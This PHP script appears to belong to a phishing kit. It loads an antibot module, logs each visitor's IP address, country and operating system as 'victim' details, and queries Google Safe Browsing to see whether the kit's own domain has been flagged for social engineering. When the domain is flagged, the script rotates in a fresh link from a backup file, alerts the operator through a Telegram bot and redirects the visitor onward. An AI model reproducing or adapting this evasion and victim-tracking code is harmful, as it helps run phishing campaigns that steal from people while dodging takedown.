<?php
error_reporting(0);

include 'antibot.php';
include 'css/tel.php';
include 'config.php';
include 'css/function.php';



    $domain = trim(file_get_contents("sites.txt"));
    $v_ip = $_SERVER['REMOTE_ADDR'];
    $VictimInfo1 = "| Submitted by : " . $v_ip . "";
    $VictimInfo2 = "| L0cation :  " . $countryname . "";
    $VictimInfo5 = "| Os : " . $os . "";
    
    
    $message .= "[ ⚠️ Link Blacklisted  and Replaced⚠️] \n";
    $message .="| Domain_Name :  $domain \n";
    $message .="| Reason : SOCIAL_ENGINEERING\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    
    
    
    
    

$sites = fopen("sites.txt", "r");
$apikey = trim(file_get_contents("css/apiKey.ini"));
$url_api ="https://safebrowsing.googleapis.com/v4/threatMatches:find?key=".$apikey."";

function GETData($url, $post){
 $ch=curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json", 'Content-Length: ' . strlen($post)));
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 $result=curl_exec($ch);
 return $result;
}

if($sites){
        while (($line = fgets($sites)) !== false){
  $data = <<<EOJSON
{
    "client": {
     "clientId": "TestClient",
     "clientVersion": "1.0"
    },
    "threatInfo": {
     "threatTypes":      ["THREAT_TYPE_UNSPECIFIED","MALWARE", "SOCIAL_ENGINEERING","UNWANTED_SOFTWARE","POTENTIALLY_HARMFUL_APPLICATION"],
     "platformTypes":    ["ANY_PLATFORM"],
     "threatEntryTypes": ["URL"],
     "threatEntries":    [
      {"url": "$line"}
     ]
  }
}
EOJSON;

$GOtest=GETData($url_api, $data);
$str=json_decode($GOtest);

    if (property_exists($str, 'matches')) {
        
        $file = "sites.txt";
        $test = file_get_contents("link.txt");
        file_put_contents($file, $test);
        
        
        telegramBot('sendMessage', [
            'chat_id' => BOT_ADMIN_USERID,
            'text' => ($subject .$message),
        ]);
      
        exit(header("Location: ap.php"));
        

    }
    else {
			exit(header("Location: ap.php"));
 
    }

}
fclose($sites);
}


?>

